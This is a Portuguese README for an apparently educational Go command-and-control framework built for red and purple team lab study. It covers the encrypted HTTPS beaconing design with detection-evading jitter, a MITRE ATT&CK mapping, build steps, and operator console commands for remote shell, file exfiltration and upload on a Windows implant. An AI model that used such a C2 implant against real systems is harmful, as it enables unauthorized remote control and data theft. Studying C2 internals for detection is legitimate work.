
![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-Red%20Team-red?style=for-the-badge&logo=matrix&logoColor=white)

![Cyber Kill Chain](https://img.shields.io/badge/Cyber%20Kill%20Chain-Lockheed%20Martin-005691?style=for-the-badge&logo=shield&logoColor=white)

![PTES](https://img.shields.io/badge/PTES-Standard-orange?style=for-the-badge&logo=securityScorecard&logoColor=white)

![Go](https://img.shields.io/badge/Go-00ADD8?style=for-the-badge&logo=go&logoColor=white)

![Status](https://img.shields.io/badge/Status-Em%20Andamento-yellow?style=for-the-badge&logo=github&logoColor=white)

# LabC2 — Framework C2 Educacional para Estudos Red Team

> ⚠️ **Aviso**: Projeto desenvolvido exclusivamente para estudo em laboratório
> autorizado, como parte de um portfólio de segurança ofensiva & defensiva, o qual faz parte de um estudo Purpleteeam *![red Team]* para simulação do ataque *![Low level]* Para estudo do comportamento em memória e o *![Blue team] Para estudo de detecção e segurança defensiva . Nenhum código
> deste repositório deve ser utilizado contra sistemas sem autorização explícita.

Framework C2 (Command & Control) minimalista escrito em **Go**, implementado
do zero para demonstrar compreensão dos mecanismos internos de ferramentas
reais (Cobalt Strike, Sliver, Havoc) — não para substituí-las.

---

## Visão Geral

```
┌──────────────────┐   POST /api/v1/beacon    ┌──────────────────┐
│   Implant (Go)   │ ─────── HTTPS+AES ────►  │   Server (Go)    │
│   Windows lab    │ ◄────── tasks cifradas ──│   Debian 12      │
└──────────────────┘                          └──────────────────┘
       │ sleep ±30% jitter                            │
       ◄──────── resultados na próxima req. ──────────┘
```

**Modelo de comunicação**: pull puro — o implante sempre inicia a conexão,
nunca escuta portas. Tarefas são enfileiradas no servidor e entregues na
resposta do beacon (mesmo padrão de Cobalt Strike/Sliver).

**Criptografia**: envelope JSON cifrado com AES-256-GCM (confidencialidade +
autenticação), chave derivada de segredo compartilhado via SHA-256.

---

## Técnicas MITRE ATT&CK Cobertas

| Técnica | ID | Onde no código |
|---|---|---|
| Web Protocols (beaconing HTTPS) | T1071.001 | `implant/beacon()` |
| Encrypted Channel (AES-GCM) | T1573.001 | `internal/proto/` |
| Remote File Copy (upload/download) | T1105 | `runTask()`, console `upload`/`download` |
| Windows Command Shell | T1059.003 | `shellExec()` |
| System Information Discovery | T1082 | check-in inicial (`SysInfo`) |
| Software/tooling obfuscation (contra YARA) | T1027 | seção de evolução |

| Técnica MITRE ATT&CK | Descrição |
| :--- | :--- |
| [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols |
| [T1573.001](https://attack.mitre.org/techniques/T1573/001/) | Encrypted Channel: Symmetric Cryptography |
| [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer |
| [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Command and Scripting Interpreter: Windows Command Shell |
| [T1082](https://attack.mitre.org/techniques/T1082/) | System Information Discovery |
| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information |

## Fases do PTES / Kill Chain Correspondentes

- **Kill Chain**: Command & Control (fase 7) + Actions on Objective (fase 8)
- **PTES**: Post-Exploitation (execução de comandos, coleta de arquivos)

---

## Estrutura do Projeto

```
lab-c2/
├── go.mod                  # módulo Go
├── Makefile                # build automatizado
├── internal/
│   └── proto/
│       └── proto.go        # mensagens + criptografia (compartilhado)
├── server/
│   └── main.go             # C2: listener HTTPS + console do operador
└──  implant/
        ├── main.go             # agente (cross-compile para Windows)
        └── c2.crt               ← copie o cert do server aqui ANTES de compilar
```

---

## Build (Debian 12)

```bash
sudo apt install -y golang-go

git clone https://github.com/seuusuario/lab-c2.git
cd lab-c2

make            # compila c2-server + implant.exe (Windows x64)
make hex        # hash do binário (documentação)
```

## Uso em Laboratório

**Servidor (Debian/atacante):**

```bash
./c2-server -port 443 -secret "chave-do-lab"
```

**Implante (VM Windows 10):**

```cmd
implant.exe
```

**Console do operador:**

```
c2> implants                          # lista agentes registrados
c2> shell a1b2c3d4 whoami
c2> download a1b2c3d4 C:\Users\aluno\Desktop\flag.txt
c2> upload a1b2c3d4 nota.txt C:\Users\Public\nota.txt
c2> sleep a1b2c3d4 60                 # aumenta dormência (low and slow)
c2> kill a1b2c3d4
```

Arquivos exfiltrados são salvos em `loot/` já descriptografados.

---

## Funcionalidades

- ✅ Beaconing HTTPS com AES-256-GCM de ponta a ponta
- ✅ Jitter de ±30% no intervalo de beaconing (quebra detecção por regularidade)
- ✅ Fila de tasks assíncrona com entrega garantida
- ✅ Upload/download de arquivos (T1105)
- ✅ Alteração de dormência em runtime (`sleep`)
- ✅ Resiliência: falha de rede não encerra o implante
- ✅ TLS self-signed gerado em runtime (server)
- ✅ Cross-compile Windows x64 com um comando

---

## Exercício Blue Team — Detecção do Próprio C2

Para visualização de regras de detecção Blue team, e estudo de segurança defensiva clicar aqui ![Blue team }(https://github.com/edenzafire/Blue_Team_Repo/tree/main/03_Identity_Access_Management_IAM)


## Referências

- [MITRE ATT&CK — Command and Control (TA0011)](https://attack.mitre.org/tactics/TA0011/)
- [Sliver C2 (BishopFox)](https://github.com/BishopFox/sliver) — arquitetura de referência
- [Havoc Framework](https://github.com/HavocFramework/Havoc) — evasion
- [YARA](https://github.com/VirusTotal/yara) / [SigmaHQ](https://github.com/SigmaHQ/sigma)
- PTES — Post-Exploitation: https://www.pentest-standard.org/index.php/Post_Exploitation

---

## Autor

**Éden Zafire** — [https://www.linkedin.com/in/edenzafire/] · [https://github.com/edenzafire]

Parte do meu portfólio Purple Team: ver também
[nome do repo do shellcode asm](link) e [novo repo futuro](link).
